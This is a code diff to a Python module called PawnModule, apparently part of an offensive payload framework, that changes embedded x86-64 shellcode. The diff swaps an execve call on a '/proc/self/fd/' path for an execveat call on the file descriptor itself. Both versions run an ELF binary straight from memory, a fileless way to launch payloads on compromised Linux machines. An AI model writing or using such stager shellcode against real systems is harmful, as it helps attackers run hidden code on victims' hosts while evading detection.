@@ -167,56 +167,17 @@ class PawnModule(Module, Socket, Assembler):
                 pop rdx
                 syscall
 
-                /*
-                 * Routine below is written by Tomas Globis (Tomasglgg)
-                 * It concatenates two parts, first one is /proc/self/fd/
-                 * second is out file descriptor
-                 */
-
-                add rsp, 16
-                mov qword ptr [rsp], 0x6f72702f
-                mov qword ptr [rsp+4], 0x65732f63
-                mov qword ptr [rsp+8], 0x662f666c
-                mov qword ptr [rsp+12], 0x002f64
+                push 0x142
+                pop rax
                 push r14
-                pop rax
-                lea rbx, [rsp+14]
-                push 0x10
-                pop rcx
-                xor rdi, rdi
-                push rax
-                pop rsi
-
-            number_len_loop:
-                xor rdx, rdx
-                div rcx
-                inc rdi
-                test rax, rax
-                jnz number_len_loop
-
-            convert_loop:
-                xor dx, dx
-                div rcx
-                add dx, 48
-                or [rbx+rdi], dx
-                dec rdi
-
-                test rax, rax
-                jnz convert_loop
-
-            end:
-                /*
-                 * Execute ELF file from file descriptor
-                 * execve(/proc/self/fd/..., [], [])
-                 */
-
-                lea rdi, [rsp]
-                push 0x3b
-                pop rax
-                cdq
-                push rdx
-                push rdi
+                pop rdi
+                push rsp
+                sub rsp, 8
                 mov rsi, rsp
+                xor r10, r10
+                xor rdx, rdx
+                push 0x1000
+                pop r8
                 syscall
         """)
 
